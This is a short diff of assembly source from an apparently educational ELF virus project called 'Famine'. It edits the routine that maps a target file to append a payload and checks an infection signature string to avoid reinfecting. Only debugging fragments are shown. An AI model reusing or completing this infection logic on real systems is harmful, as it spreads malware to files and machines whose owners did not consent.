@@ -1,7 +1,10 @@
 %include "inc/famine.inc"
 
 default rel
-
+; _dummy_host_entrypoint:
+;     mov rax, SC_EXIT
+;     xor rdi, rdi
+;     syscall
 section .text
     ; Trazas
     dir db              "[+] dir",10,0  ;9
@@ -154,7 +157,7 @@ section .text
                     jmp .close_file
 
             .mmap:
-
+                TRACE_TEXT hello, 11
                 ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
                 mov eax, dword VAR(Famine.file_original_len)
                 ; align current size to end at 4K page so our payload is aligned by writing it
@@ -180,12 +183,13 @@ section .text
                 mov VAR(Famine.mmap_ptr), rax   ; save mmap_ptr
 
             .check_infect:
-                mov ecx,  Traza_position
+                mov rcx, dword Traza_position
                 mov rsi, rax
                 movzx rbx, dword VAR(Famine.file_original_len)
                 add rsi, rbx
                 sub rsi, rcx
-                lea rdi, [rel Traza]
+                lea rdi, Traza
+                mov rcx, 20
                 cld
                 rep cmpsb
                 je .munmap
@@ -387,6 +391,7 @@ section .text
 
         .exit:
         _dummy_host_entrypoint:
+
             mov rax, SC_EXIT
             xor rdi, rdi
             syscall
